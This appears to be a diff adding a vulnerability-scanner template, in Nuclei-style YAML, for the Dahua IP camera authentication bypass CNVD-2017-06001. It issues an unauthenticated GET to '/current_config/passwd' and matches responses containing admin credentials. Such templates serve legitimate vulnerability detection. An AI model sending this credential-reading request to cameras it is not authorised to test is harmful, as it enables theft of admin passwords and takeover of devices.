@@ -1,0 +1,29 @@
+id: dahua-cnvd-2017-06001
+
+info:
+  name: Dahua Authentication Bypass - CNVD-2017-06001
+  author: kamerka-fork
+  severity: critical
+  description: |
+    Dahua IP cameras are vulnerable to an authentication bypass that allows
+    unauthenticated users to obtain admin credentials by accessing specific API endpoints.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2017-06001
+  tags: china-iot,dahua,auth-bypass,cnvd
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/current_config/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "admin"
+          - "password"
+        condition: and
